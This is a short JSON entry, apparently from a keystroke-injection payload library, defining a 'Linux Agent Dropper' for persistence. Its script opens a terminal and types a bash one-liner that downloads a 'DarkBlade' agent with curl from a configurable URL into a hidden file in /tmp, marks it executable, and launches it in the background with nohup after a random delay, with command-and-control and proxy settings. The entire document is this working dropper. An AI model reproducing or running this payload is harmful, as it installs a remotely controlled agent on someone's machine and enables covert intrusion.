{
  "name": "Linux Agent Dropper",
  "category": "Persistence",
  "os": "Linux",
  "description": "Download, jitter, and background-run DarkBlade agent with optional proxy",
  "script": "REM Linux Agent Dropper with jitter and proxy\nCTRL ALT T\nDELAY 600\nSTRING bash -lc \"DB_C2=${C2_URL}; DB_JITTER=${JITTER:=30}; DB_SLEEP=${SLEEP:=60}; DB_PROXY=${PROXY:=}; URL=${AGENT_URL}; f=/tmp/.db; curl -fsSL $URL -o $f; chmod +x $f; (sleep $((RANDOM%$DB_JITTER)); nohup $f >/dev/null 2>&1 &)\"\nENTER\n"
}